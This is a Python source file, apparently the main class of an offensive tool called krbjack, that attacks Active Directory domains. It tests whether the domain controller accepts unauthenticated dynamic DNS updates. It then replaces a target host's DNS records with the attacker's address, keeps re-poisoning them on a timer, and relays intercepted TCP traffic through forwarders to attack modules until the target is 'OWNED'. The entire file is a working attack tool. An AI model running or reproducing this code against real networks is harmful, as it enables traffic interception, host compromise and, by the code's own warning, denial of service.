from ipaddress import IPv4Network, IPv4Address
from colorama import Fore, Style
from uuid import uuid4
import dns.resolver
import dns.update
import dns.query
import dns.rcode
import importlib
import random
import socket
import queue

from krbjack.tcpforward import TCPForwardThread
from krbjack.utils import PeriodicTimer


class KrbJacker:
    def __init__(self, args, modules):
        self.args = args
        self.destination_name = args.target_name
        self.domain = args.domain
        self.dc_ip = str(args.dc_ip)
        self.is_check = args.check
        self.ports = args.ports
        self.should_poison = not args.no_poison
        self.forwarders = []
        self.ignore_set = set()
        self.is_poisoning_active = False
        self.owned = False
        self.available_modules = [importlib.import_module(f"krbjack.modules.{m}") for m in modules]
        self.running_modules = []

        # Get our own IP here
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((self.dc_ip, 53))
            self.my_ip = s.getsockname()[0]
            s.close()
        except socket.timeout:
            print(
                Fore.LIGHTRED_EX, f"The DNS server {self.dc_ip} doesnt look to be reachable 🤔.",
                Fore.RESET
            )
            exit(1)

        # DNS Request to get ip addresses for this target
        try:
            self.original_ips = self.get_dns_record(self.destination_name)
        except dns.resolver.NXDOMAIN:
            print(
                f"\tIt looks like {Fore.LIGHTRED_EX}something is wrong{Fore.RESET}, the dns server "
                f"(DC) located at {Fore.LIGHTBLUE_EX}{self.dc_ip}{Fore.RESET} does not look to know"
                f" the name {Fore.LIGHTBLUE_EX}{self.destination_name}{Fore.RESET}"
            )
            print("\tMaybe you mispelled something ?")
            print("Bye.")
            exit(1)
        if args.target_ip:
            self.destination_ip = str(args.target_ip)
        else:
            # Chosing one IP to talk to the target from the ones available
            # Naive scan on tcp 445 to determine which IP to use
            self.destination_ip = None
            for ip in self.original_ips:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(3.0)
                    s.connect((ip, 445))
                    s.close()
                    self.destination_ip = ip
                except (TimeoutError, OSError):
                    continue
            if self.destination_ip is None:
                print(
                    f"{Fore.LIGHTRED_EX}Something is not right{Fore.RESET}, it looks like you "
                    f"cannot reach any of the IP addresses suggested by the DNS server (the DC).\n"
                    "Maybe try with the --target-ip option to override this naive detection."
                )
                exit(1)

    # Queries DNS to get a list of answers for a typical A query
    def get_dns_record(self, name):
        resolver = dns.resolver.Resolver(configure=False)
        resolver.nameservers = [self.dc_ip]
        answers = resolver.resolve(f"{name}.{self.domain}", "A")
        return [answer.address for answer in answers]

    # Adds a single record A for this (name, ip)
    def add_dns_record(self, record_name, ip):
        add = dns.update.Update(f"{self.domain}.")
        add.add(record_name, 300, "A", ip)
        response = dns.query.tcp(add, self.dc_ip, timeout=10)
        return response.rcode()

    # Removes all records with the given name
    def del_dns_record(self, record_name):
        delete = dns.update.Update(f"{self.domain}.")
        delete.delete(record_name)
        response = dns.query.tcp(delete, self.dc_ip, timeout=10)
        return response.rcode()

    # Returns wether the main domain zone is vulnerable to a DNS record poisoning
    def check(self):
        # to check, we try to add a random record and see if it works
        # Generation of a random RFC1918 private IPv4 address
        networks = [
            IPv4Network("10.0.0.0/8"), IPv4Network("192.168.0.0/16"), IPv4Network("172.16.0.0/12")
        ]
        network = random.choice(networks)
        name = str(uuid4())
        ip = IPv4Address(
            random.randrange(
                int(network.network_address) + 1, int(network.broadcast_address) - 1
            )
        )
        response = self.add_dns_record(name, str(ip))
        if response == dns.rcode.NOERROR:
            self.del_dns_record(name)
            return True
        else:
            return False

    def run(self):
        is_poisonable = self.check()
        if self.is_check:
            print(
                "Check mode : no poisoning will be done, no man-in-the-middle made nor any "
                "side-effect inducing actions."
            )
            if is_poisonable:
                print("\t", Fore.GREEN, Style.BRIGHT, "This domain IS vulnerable.")
            else:
                print(Fore.RED, Style.BRIGHT, "This domain IS NOT vulnerable")
            print(Style.RESET_ALL, Fore.RESET, end="")
            exit(0)
        if not is_poisonable and self.should_poison:
            print(
                "The domain is not vulnerable to DNS records poisoning. If you found another way"
                " to intercept traffic anyway, you can add the --no-poison flag. Else, you're "
                "doomed 🤷."
            )
            exit(0)
        print("Running all the stuff, you can ctrl+c ONCE to stop everything.")
        print(
            "If you kill everything mid attack you take the risk to leave a "
            "DNS poisoning up leading to a complete denial of service"
        )
        print("---")
        interesting_packet_queue = queue.Queue()
        # Creation of TCP forwarder threads, one for each port we want to pipe with the target
        # destination

        # Starts TCP Forwardig
        def false(*args):
            return False, False
        try:
            # For each port to forward
            for dport in self.ports:
                functions = []
                # We check if a module has a method to catch packets on this port
                for module in self.available_modules:
                    m = module.Module(self.args)
                    # If it is the case, we add the function to check packets
                    # to the list of functions to catch interesting packets
                    if dport == m.port:
                        self.running_modules.append(m)
                        functions.append(m.packet_to_catch)
                # If no module matches a port of interest, the default function
                # is "false" upper here and just returns false all the time.
                if not functions:
                    functions.append(false)
                print(
                    f"{Fore.LIGHTBLACK_EX}Starting forwarder 0.0.0.0:{dport}<->"
                    f"{self.destination_ip}:{dport} ...{Fore.RESET}"
                )
                self.forwarders.append(
                    TCPForwardThread(
                        self.destination_ip, dport, interesting_packet_queue,
                        functions, self.ignore_set
                    )
                )
        except PermissionError:
            print(f"Cant do that without admin rights, port {dport} is privileged/<1024.")
            exit(1)
        # Start TCP forwarders in background
        for forwarder in self.forwarders:
            forwarder.start()
        print(f"{Fore.LIGHTBLACK_EX}Forwarders started and enabled.{Fore.RESET}")
        if self.should_poison:
            print(f"{Fore.LIGHTBLACK_EX}Starting periodic DNS poisoning...{Fore.RESET}")
            self.poison_timer = PeriodicTimer(
                10, self.poison
            )
            self.poison_timer.start()
            self.is_poisoning_active = True
        while not self.owned:
            print("--- --- Now waiting for clients --- ---")
            # Now we wait for interesting packes. Queue.get() is blocking.
            # Then we can extract the interesting packet from the Queue shared by all forwarders
            # The module variable contains the module object that sent the packet to the queue
            client_ip, the_packet, the_module = interesting_packet_queue.get()
            # We then run the module who found the packet interesting
            print(Fore.LIGHTYELLOW_EX, end="")
            self.owned = the_module.run(self, client_ip, the_packet)
            print(Fore.RESET, end="")
            if not self.owned:
                self.ignore_set.add(client_ip[0])
                print(f"Added {client_ip[0]} to ignore set.")
            else:
                print(f"{Fore.GREEN} === OWNED ==={Fore.RESET}")
        # Here the attack is finished and was successful, poisoning must be stopped
        if self.is_poisoning_active:
            self.unpoison()
        self.stop_forwarding()

    def stop_forwarding(self):
        for forwardThread in self.forwarders:
            forwardThread.forwarder.socket.close()
            forwardThread.forwarder.shutdown()

    def unpoison(self):
        self.poison_timer.cancel()
        self.poison_timer.thread.join()
        print(f"Restauring DNS records correctly : A {self.destination_name} {self.original_ips}")
        # delete our poison record
        self.del_dns_record(self.destination_name)
        # add one record for each original_ip
        for ip in self.original_ips:
            self.add_dns_record(self.destination_name, ip)
        self.is_poisoning_active = False
        print(f"\t... {Fore.LIGHTGREEN_EX}Done{Fore.RESET}, DNS records are okay now")

    def poison(self):
        # Check first if it is necessary to poison again
        answers = self.get_dns_record(self.destination_name)
        if len(answers) == 1 and answers[0] == self.my_ip:
            return
        else:
            # Then if necessary :
            #   delete all records pointing to self.destination_name
            self.del_dns_record(self.destination_name)
            #   add one record pointing to us
            print(
                f"{Fore.LIGHTBLACK_EX}Poisoning ... : A {self.destination_name}"
                f" -> {self.my_ip}{Fore.RESET}"
            )
            self.add_dns_record(self.destination_name, self.my_ip)
